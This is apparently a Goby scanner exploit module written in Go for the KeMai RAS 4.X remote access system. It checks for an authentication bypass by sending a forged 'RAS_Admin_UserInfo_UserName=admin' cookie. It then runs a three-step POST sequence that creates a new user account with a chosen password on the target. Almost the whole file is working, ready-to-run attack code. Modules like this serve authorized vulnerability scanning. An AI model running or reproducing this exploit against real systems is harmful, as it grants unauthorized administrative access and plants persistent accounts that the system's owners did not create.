package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "KeMai RAS 4.X user login bypass",
    "Description": "Add Cookie:RAS_Admin_UserInfo_Username=admin to log in as admin",
    "Product": "comexe-RAS",
    "Homepage": "https://www.dns0755.net/",
    "DisclosureDate": "2017-11-15",
    "Author": "1291904552@qq.com",
    "GobyQuery": "app=\"Komai-ARAS system\"",
    "Level": "2",
    "Impact": "<p></p>",
    "Recommandation": "",
    "References": [
        "https://xz.aliyun.com/t/9809#toc-0"
    ],
    "HasExp": true,
    "ExpParams": [
        {
            "name": "user",
            "type": "input",
            "value": "admin123"
        },
        {
            "name": "pass",
            "type": "input",
            "value": "admin123"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": null,
    "ExploitSteps": null,
    "Tags": [
        "login-bypass"
    ],
    "CVEIDs": null,
    "CVSSScore": "0.0",
    "AttackSurfaces": {
        "Application": [
            "comexe-RAS"
        ],
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10198",
    "Recommendation": ""
}`
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri_1 := "/server/CmxUser.php?pgid=UserList"
			cfg_1 := httpclient.NewGetRequestConfig(uri_1)
			cfg_1.VerifyTls = false
			cfg_1.Header.Store("Cookie", "RAS_Admin_UserInfo_UserName=admin")
			if resp_1, err := httpclient.DoHttpRequest(u, cfg_1); err == nil {
				if strings.Contains(resp_1.Utf8Html, "名称") && strings.Contains(resp_1.Utf8Html, "usingeKey") {
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			user := ss.Params["user"].(string)
			pass := ss.Params["pass"].(string)
			uri_1 := "/Server/CmxUser.php?pgid=AddUser_Step3&eflag=1"
			cfg_1 := httpclient.NewPostRequestConfig(uri_1)
			cfg_1.VerifyTls = false
			cfg_1.Header.Store("Cookie", "RAS_Admin_UserInfo_UserName=admin")
			cfg_1.Data = fmt.Sprintf(`UserName=%s&Password0=%s&Password1=%s&rad_EKEY0=%%E4%%B8%%8D%%E7%%BB%%91%%E5%%AE%%9A&rad_Mac0=0&BindMac=1&rad_pwd=1&rad_Logon0=0&chk_date0=1&Date0=2021-06-20&LogonWeek%%5B2%%5D=2&LogonWeek%%5B3%%5D=3&LogonWeek%%5B4%%5D=4&LogonWeek%%5B5%%5D=5&LogonWeek%%5B6%%5D=6&LogonWeek%%5B7%%5D=7&LogonWeek%%5B1%%5D=1&LogonHour0=0&LogonMinute0=0&LogonHour1=23&LogonMinute1=59&sss=`, user, pass, pass)
			if resp_1, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg_1); err == nil {
				if resp_1.StatusCode == 200 {
					uri_2 := "/Server/CmxUser.php?pgid=AddUser_Step4"
					cfg_2 := httpclient.NewPostRequestConfig(uri_2)
					cfg_2.VerifyTls = false
					cfg_2.Header.Store("Cookie", "RAS_Admin_UserInfo_UserName=admin")
					cfg_2.Data = fmt.Sprintf(`NMNext=%%E4%%B8%%8B%%E4%%B8%%80%%E6%%AD%%A5%%3E&UserName=RAS_%s`, user)
					if resp_2, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg_2); err == nil {
						if resp_2.StatusCode == 200 {
							uri_3 := "/Server/CmxUser.php?pgid=AddUser_Step5OK"
							cfg_3 := httpclient.NewPostRequestConfig(uri_3)
							cfg_3.VerifyTls = false
							cfg_3.Header.Store("Cookie", "RAS_Admin_UserInfo_UserName=admin")
							cfg_3.Data = fmt.Sprintf(`NMNext=%%E7%%A1%%AE%%E5%%AE%%9A&UserName=RAS_%s`, user)
							if resp_3, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg_3); err == nil {
								if resp_3.StatusCode == 200 {
									expResult.Output = fmt.Sprintf("add account success, use %s/%s to login", user, pass)
									expResult.Success = true
								}
							}
						}
					}
				}
			}
			return expResult
		},
	))
}
